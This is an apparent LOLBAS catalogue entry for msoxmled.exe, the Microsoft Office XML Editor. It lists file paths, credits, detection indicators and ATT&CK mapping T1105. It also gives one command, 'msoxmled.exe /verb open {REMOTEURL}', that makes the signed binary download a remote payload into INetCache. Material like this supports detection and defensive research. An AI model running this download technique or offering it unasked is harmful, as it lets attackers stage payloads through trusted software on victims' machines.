---
title: "msoxmled.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Binaries/Msoxmled/
fetched_at: 2026-09-20T17:10:49Z
license: unspecified
category: windows
---

Microsoft Office XML Editor, used to handle XML documents in Microsoft Office.

## Paths
- C:\Program Files\Microsoft Office\root\vfs\ProgramFilesCommonX64\Microsoft Shared\Office16\msoxmled.exe
- C:\Program Files (x86)\Common Files\Microsoft Shared\OFFICE14\msoxmled.exe

## Resources
- [https://learn.microsoft.com/en-us/answers/questions/4805030/where-is-msoxmled-exe-for-office-professional-2013](https://learn.microsoft.com/en-us/answers/questions/4805030/where-is-msoxmled-exe-for-office-professional-2013)

## Acknowledgements
- Bogac Kaya ([@bogackayaa](https://twitter.com/@bogackayaa))
- Furkan Celik ([@frknclk034](https://twitter.com/@frknclk034))

## Detections
- IOC: msoxmled.exe making network connections to external URLs
- IOC: Unexpected file downloads initiated by msoxmled.exe
- IOC: Event ID 1 with Image: msoxmled.exe and CommandLine: /verb open

## Download

1. Downloads payload from remote server using the Microsoft Office XML Editor.

```
msoxmled.exe /verb open {REMOTEURL}
```

   - Use case: It will download a remote payload and place it in INetCache.

   - Privileges required: User

   - Operating systems: Windows 10, Windows 11

   - ATT&CK® technique: T1105

   - Tags: Download: INetCache
